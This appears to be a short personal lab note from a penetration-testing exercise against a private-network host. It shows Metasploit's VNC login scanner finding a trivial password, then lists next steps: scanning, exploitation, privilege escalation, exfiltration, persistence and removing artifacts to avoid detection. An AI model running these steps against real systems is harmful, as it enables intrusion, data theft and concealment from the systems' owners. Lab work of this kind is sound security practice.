# Web Server Exploitations

## VNC (Port 5900)

    msf auxiliary(scanner/vnc/vnc_login) > run
    [*] 192.168.56.106:5900   - 192.168.56.106:5900 - Starting VNC login sweep
    [!] 192.168.56.106:5900   - No active DB -- Credential data will not be saved!
    [+] 192.168.56.106:5900   - 192.168.56.106:5900 - Login Successful: :password
    [*] 192.168.56.106:5900   - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf auxiliary(scanner/vnc/vnc_login) > sessions

so this was kind of a week credential attack eh?

Im not even sure it counts as exploitation for the given project.
Lets do better

next steps:

1. Rescan the environment from the container and ensure routes are wired correctly.

2. Use nmap to scan for open ports and services on the target machine.

3. Identify any vulnerabilities in the services running on the target machine.

4. Use Metasploit or other exploitation frameworks to exploit any identified vulnerabilities. #we can also try manual exploitation techniques if we want to learn more about the underlying vulnerabilities. I DO BOI

5. After gaining access, perform post-exploitation activities such as privilege escalation, data exfiltration, or maintaining persistence on the target machine.

6. Document all findings and steps taken during the exploitation process for future reference and learning purposes 

7. Finally, ensure to clean up any artifacts left on the target machine to avoid detection and maintain operational security. 